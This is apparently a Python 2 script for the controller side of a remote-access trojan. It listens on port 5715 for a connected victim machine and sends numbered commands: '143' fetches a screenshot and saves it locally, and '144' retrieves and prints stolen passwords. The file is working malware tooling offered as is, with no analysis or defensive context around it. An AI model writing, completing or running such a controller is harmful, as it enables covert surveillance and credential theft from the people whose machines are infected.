import socket
import sys
import signal
from PIL import Image
from StringIO import StringIO

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

def getSizeOfCommand(s):
    sizearray = []
    size = 1
    data = s.recv(1)
    if data == "!":
        data = None
        while data != "!":
            data = s.recv(size)
            if data != "!" and data != "\n":
                sizearray.append(data)
    size = 0
    for i in range(0,len(sizearray)):
        size += int(sizearray[i]) * pow(10,len(sizearray)-i-1)
    return size

host = '0.0.0.0' 
port = 5715 
backlog = 5
size = 1
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(backlog)
client, address = s.accept()

while 1:
    cmd = raw_input("Enter command: ")
    inp = "!" + str(len(cmd)) + "!" + cmd
    client.send(inp)
    if cmd == "143": #screenshot
        size = getSizeOfCommand(client)
        data = client.recv(size)
        im = Image.open(StringIO(data))
        im.save('C:\Users\Matt\Desktop\\newpic.png','png')
    elif cmd == "144": #passwords
        size = getSizeOfCommand(client)
        data = client.recv(size)
        print data
    else:
        print "what"
